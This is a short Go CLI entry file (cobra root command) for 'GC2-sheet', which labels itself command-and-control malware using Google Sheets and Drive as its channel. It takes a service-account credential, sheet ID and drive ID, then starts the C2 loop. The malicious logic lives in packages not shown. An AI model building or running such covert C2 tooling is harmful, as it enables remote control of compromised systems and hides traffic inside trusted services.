package cmd

import (
	"github.com/spf13/cobra"
	"os"
	"GC2-sheet/internal/configuration"
	"GC2-sheet/internal/C2"
)

var (
	credential string
	sheetId string
	driveId string
)



var rootCmd = &cobra.Command{
	Use:   "gc2-sheet",
	Short: "gc2-sheet new C2 malware that uses Google Sheet as command & control.",
	Long: `gc2-sheet new C2 malware that uses Google Sheet as command & control.`,
	Run: func(cmd *cobra.Command, args []string) {

		configuration.SetOptions(credential, sheetId, driveId)
		C2.Run()

	},
}

func init()  {

	rootCmd.Flags().StringVarP(&credential, "key", "k", "", "GCP service account credential in JSON")
	rootCmd.MarkFlagRequired("key")

	rootCmd.Flags().StringVarP(&sheetId, "sheet", "s", "", "Google sheet ID")
	rootCmd.MarkFlagRequired("sheet")

	rootCmd.Flags().StringVarP(&driveId, "drive", "d", "", "Google drive ID")
	rootCmd.MarkFlagRequired("drive")
}

func Execute() {
	if err := rootCmd.Execute(); err != nil {


		os.Exit(1)
	}
}